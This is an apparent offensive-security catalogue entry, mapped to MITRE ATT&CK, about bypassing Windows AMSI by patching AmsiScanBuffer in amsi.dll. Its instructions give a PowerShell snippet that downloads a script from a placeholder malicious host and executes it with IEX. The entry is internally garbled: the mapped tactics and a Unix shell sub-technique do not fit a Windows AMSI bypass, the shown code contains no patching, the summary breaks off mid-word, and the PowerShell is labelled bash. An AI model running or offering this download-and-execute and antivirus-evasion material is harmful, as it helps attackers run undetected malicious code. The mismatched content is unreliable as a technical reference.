---
id: 854d951b-be94-496b-8f28-cc997a2d9d02
name: Patching amsi.dll AmsiScanBuffer to bypass AMSI by rasta-mouse
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:25.920352+00:00'
updated_at: '2023-04-10T20:36:16.200630+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Event Triggered Execution|T1546 - Event Triggered Execution]]'
sub_techniques:
- '[[Unix Shell Configuration Modification|T1546.004 - Unix Shell Configuration Modification]]'
tags:
- '[[Dont use net webclient]]'
- '[[Patching amsi.dll AmsiScanBuffer by rasta-mouse]]'
commands:
- '[[Download and execute malicious script]]'
---

# Patching amsi.dll AmsiScanBuffer to bypass AMSI by rasta-mouse

## Summary

This procedure involves patching the AmsiScanBuffer function in the amsi.dll file to bypass the Antimalware Scan Interface (AMSI) used by Windows Defender and other antivirus products. This technique can be used by an attacker to execute malicious scripts that would otherwise be detected and blocke

## Description

# Description

This procedure involves patching the AmsiScanBuffer function in the amsi.dll file to bypass the Antimalware Scan Interface (AMSI) used by Windows Defender and other antivirus products. This technique can be used by an attacker to execute malicious scripts that would otherwise be detected and blocked by AMSI.

At a technical level, this procedure involves locating the amsi.dll file, opening it in a hex editor, and searching for the AmsiScanBuffer function. The bytes of the function can then be replaced with a NOP (no operation) instruction, effectively disabling AMSI for any subsequent script execution. 

The business value of this procedure is that it allows an attacker to bypass antivirus protections and execute malicious scripts, potentially leading to the compromise of sensitive data or systems.

## Requirements

1. Access to the target system

1. Permission to modify system files

1. Hex editor software or similar tool

## Defense

1. Ensure that antivirus products are kept up to date with the latest signatures

1. Implement application whitelisting to prevent unauthorized software from running

1. Monitor system logs for signs of unauthorized file modifications

## Objectives

1. Bypass AMSI to execute malicious scripts undetected

1. Compromise sensitive data or systems

# Instructions

1. This command executes a malicious script by sending a web request to a URL hosting the script and then executing the script on the system using the Invoke-Expression cmdlet.

**Code**: [[$webreq = [System.Net.WebRequest]::Create(‘https:/]]

> The script is downloaded from a remote server and executed on the system without any user interaction. This can be used to perform various malicious activities such as stealing sensitive information, installing malware, or gaining unauthorized access to the system.

**Command** ([[Download and execute malicious script]]):

```bash
$webreq = [System.Net.WebRequest]::Create(‘https://maliciousscripturl/malicious.ps1’)
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$reader=[System.IO.StreamReader]::new($respstream)
$content=$reader.ReadToEnd()
IEX($content)
```

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Event Triggered Execution|T1546 - Event Triggered Execution]]

### Sub-Techniques

- [[Unix Shell Configuration Modification|T1546.004 - Unix Shell Configuration Modification]]

## Commands Used

- [[Download and execute malicious script]]

## Tags

- [[Dont use net webclient]]
- [[Patching amsi.dll AmsiScanBuffer by rasta-mouse]]
